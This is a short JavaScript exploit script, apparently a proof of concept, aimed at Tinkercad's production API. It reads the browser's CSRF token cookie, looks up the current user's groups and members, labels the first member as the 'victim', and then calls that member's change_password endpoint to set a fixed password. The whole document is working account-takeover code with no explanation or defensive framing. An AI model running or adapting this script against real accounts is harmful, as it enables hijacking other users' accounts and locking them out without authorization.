(async () => {
  const cookieStr=document.cookie
  const csrfToken = cookieStr
  .split("; ")
  .find(c => c.startsWith("csrf-token="))
  ?.split("=")[1];
  const userRes = await fetch(
    "https://api-reader-prd.tinkercad.com/users/",
    {
      method: "GET",
      credentials: "include",
      cache: "no-store"
    }
  );

  const user = await userRes.json();
  const userId = user.id;
  console.log("User ID:", userId);

  // 2️⃣ Fetch user groups
  const groupsRes = await fetch(
    `https://api-reader-prd.tinkercad.com/users/${userId}/groups`,
    {
      method: "GET",
      credentials: "include",
      cache: "no-store"
    }
  );

  const groups = await groupsRes.json();
  const groupId = groups[0]?.id;
  console.log("Group ID:", groupId);

  if (!groupId) return;

  // 3️⃣ Fetch group members
  const membersRes = await fetch(
    `https://api-reader-prd.tinkercad.com/users/${userId}/groups/${groupId}/members?pageSize=2000&type=0&userAvatars=true`,
    {
      method: "GET",
      credentials: "include",
      cache: "no-store"
    }
  );

  const members = await membersRes.json();
  const memberId = members[0]?.member_id;
  const name = members[0]?.name;
  alert("victim name: "+name);
  console.log("Member ID:", memberId);
  
  fetch(`https://api-reader-prd.tinkercad.com/users/${memberId}/change_password`, {
  method: "POST",
  mode: "cors",
  credentials: "include", // sends cookies
  headers: {
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "X-Csrf-Token": csrfToken
  },
  body: new URLSearchParams({
    new_password: "Password000@",
    new_password2: "Password000@"
  })
})
.then(res => res.json())
.then(data => console.log(data))
.catch(err => console.error(err));

})();
